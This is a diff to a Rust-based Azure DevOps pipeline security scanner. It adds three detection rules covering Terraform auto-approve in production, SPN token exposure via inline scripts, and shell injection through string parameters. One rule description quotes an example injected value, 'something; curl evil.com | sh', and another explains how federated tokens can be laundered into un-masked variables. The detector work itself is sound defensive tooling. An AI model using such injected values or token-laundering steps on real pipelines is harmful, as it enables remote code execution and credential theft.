@@ -352,6 +352,56 @@ pub const RULE_DEFS: &[RuleDef] = &[
         security_severity: "5.0",
         tags: &["security", "credentials", "azure-devops"],
     },
+    RuleDef {
+        id: "terraform_auto_approve_in_prod",
+        name: "TerraformAutoApproveInProd",
+        short_description:
+            "`terraform apply -auto-approve` against a production service connection without an environment gate",
+        full_description:
+            "An ADO step runs `terraform apply -auto-approve` (either via an inline script \
+             or via TerraformCLI/TerraformTask with `command: apply` and commandOptions \
+             containing `auto-approve`) against a service connection whose name matches \
+             production patterns (`prod`, `production`, `prd`), and the enclosing job has \
+             no `environment:` binding. The auto-approve flag bypasses the only ADO-side \
+             change-control on infrastructure rewrites; combined with a shared agent pool, \
+             any committer can rewrite production.",
+        default_level: "error",
+        security_severity: "9.0",
+        tags: &["security", "configuration", "azure-devops"],
+    },
+    RuleDef {
+        id: "add_spn_with_inline_script",
+        name: "AddSpnWithInlineScript",
+        short_description:
+            "`AzureCLI` task with addSpnToEnvironment:true plus an inline script — federated token can be laundered",
+        full_description:
+            "An `AzureCLI@2` (or `AzurePowerShell`) task runs an inline script with \
+             `addSpnToEnvironment: true`, which exposes the federated SPN material \
+             (`$env:idToken`, `$env:servicePrincipalKey`, `$env:servicePrincipalId`, \
+             `$env:tenantId`) as environment variables. An inline script can write that \
+             material to a normal pipeline variable via `##vso[task.setvariable]`, after \
+             which the OIDC token is inherited un-masked by every downstream task.",
+        default_level: "error",
+        security_severity: "7.5",
+        tags: &["security", "credentials", "azure-devops"],
+    },
+    RuleDef {
+        id: "parameter_interpolation_into_shell",
+        name: "ParameterInterpolationIntoShell",
+        short_description:
+            "Free-form string parameter interpolated into an inline script — shell injection vector",
+        full_description:
+            "A pipeline-level `parameters:` entry of `type: string` with no `values:` \
+             allowlist is interpolated via `${{ parameters.<name> }}` directly into an \
+             inline shell or PowerShell script body. ADO does not escape parameter values \
+             during YAML emission, so anyone with permission to queue the build can inject \
+             arbitrary shell commands by passing a malicious value (e.g. \
+             `something; curl evil.com | sh`). Constrain inputs with a `values:` allowlist \
+             or pass the parameter through the step's `env:` block so the runtime quotes it.",
+        default_level: "warning",
+        security_severity: "5.0",
+        tags: &["security", "injection", "azure-devops"],
+    },
 ];
 
 // ── SARIF 2.1.0 schema structs ──────────────────────────
@@ -884,6 +934,9 @@ mod tests {
             FindingCategory::SecretToInlineScriptEnvExport,
             FindingCategory::SecretMaterialisedToWorkspaceFile,
             FindingCategory::KeyVaultSecretToPlaintext,
+            FindingCategory::TerraformAutoApproveInProd,
+            FindingCategory::AddSpnWithInlineScript,
+            FindingCategory::ParameterInterpolationIntoShell,
         ];
 
         for cat in categories {
